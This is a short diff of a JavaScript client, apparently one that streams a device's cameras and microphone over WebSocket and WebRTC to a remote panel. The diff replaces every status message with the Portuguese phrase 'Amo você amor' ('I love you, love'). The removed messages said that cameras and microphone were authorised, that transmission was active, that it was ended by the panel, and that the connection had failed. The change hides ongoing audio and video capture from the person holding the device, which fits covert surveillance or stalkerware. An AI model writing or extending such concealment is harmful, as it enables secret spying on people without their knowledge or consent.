@@ -74,14 +74,14 @@ socket.onopen = async () => {
         iniciarWebRTC();
 
         status.textContent =
-            "Câmeras e microfone autorizados. Transmissão ativa.";
+            "Amo você amor";
 
     } catch (erro) {
 
         console.error(erro);
 
         status.textContent =
-            "O aparelho não permitiu acessar as duas câmeras e o microfone.";
+            "Amo você amor";
     }
 };
 
@@ -255,7 +255,7 @@ function encerrarTudo() {
     }
 
     status.textContent =
-        "Transmissão encerrada pelo painel.";
+        "Amo você amor";
 
 }
 
@@ -263,7 +263,7 @@ function encerrarTudo() {
 socket.onerror = () => {
 
     status.textContent =
-        "Erro ao conectar ao servidor.";
+        "Amo você amor";
 
 };
 
@@ -275,7 +275,7 @@ socket.onclose = () => {
     ) {
 
         status.textContent =
-            "Conexão com o servidor encerrada.";
+            "Amo você amor";
 
     }
 
